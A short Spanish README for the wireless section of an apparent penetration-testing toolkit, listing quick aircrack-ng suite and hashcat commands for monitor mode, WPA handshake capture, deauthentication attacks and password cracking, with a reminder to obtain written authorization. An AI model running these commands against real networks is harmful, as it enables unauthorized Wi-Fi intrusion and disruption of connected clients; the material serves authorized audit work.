# 09-wireless

Auditoría de redes inalámbricas: captura y análisis de WPA/WPA2, deautenticación, Evil Twin...

## Qué buscar
- Redes WPA/WPA2 con handshake capturable
- APs con WPS habilitado (Pixie Dust)
- Redes abiertas o con encriptación débil
- Clientes conectados (para deauth/handshake)

## Herramientas

| Script | Plataforma | Qué hace |
|--------|------------|----------|
| [cheatsheet-wireless](cheatsheet-wireless.md) | Linux | WPA, handshake, deauth, Evil Twin, PMKID, cracking |

## Comandos rápidos

```bash
# Modo monitor
airmon-ng start wlan0
airmon-ng check kill

# Escaneo de redes
airodump-ng wlan0mon

# Capturar handshake
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w captura wlan0mon
aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF wlan0mon

# Cracking
aircrack-ng -w rockyou.txt captura-01.cap
hashcat -m 22000 hash.hc22000 rockyou.txt
```

## Tips
- Siempre usar autorización escrita antes de auditorías WiFi
- El handshake se captura cuando un cliente se conecta/deconecta
- PMKID funciona sin clientes (mejor para WPA2)
- `hashcat` con GPU es mucho más rápido que `aircrack` con CPU
